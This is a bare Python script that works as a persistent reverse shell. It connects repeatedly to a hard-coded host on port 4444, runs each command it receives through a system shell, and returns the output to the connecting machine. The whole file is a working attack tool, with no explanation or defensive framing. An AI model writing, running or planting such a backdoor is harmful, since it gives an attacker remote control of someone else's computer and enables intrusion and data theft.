#!/usr/bin/env python
import sys
import time
import socket
import subprocess

HOST = '192.168.1.11'
PORT = 4444

def connect(t):
    host, port = t
    go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    go.connect((host, port))
    return go

def wait(go):
    data = go.recv(1024)
    if data == 'exit\n':
        go.close()
        sys.exit(0)
    elif len(data) == 0:
        return True
    else:
        p = subprocess.Popen(data, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
        stdout = p.stdout.read() + p.stderr.read()
        go.send(stdout)
        return False

def main():
    while True:
        dead = False
        try:
            t = (HOST, PORT)
            go = connect(t)
            while not dead:
                dead = wait(go)
            go.close()
        except socket.error:
            pass
        time.sleep(2)

if __name__ == '__main__':
    sys.exit(main())

